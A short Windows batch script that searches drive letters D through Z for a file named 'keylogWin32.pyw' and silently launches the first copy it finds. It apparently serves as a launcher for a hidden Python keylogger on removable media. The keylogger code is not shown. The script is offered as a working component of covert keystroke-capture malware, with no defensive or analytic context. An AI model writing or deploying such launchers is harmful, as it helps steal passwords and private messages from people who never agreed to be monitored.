@echo off

setlocal

set "filename=keylogWin32.pyw"

for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\%filename%" (
        start "" "%%d:\%filename%"
        goto :end
    )
)

:end

endlocal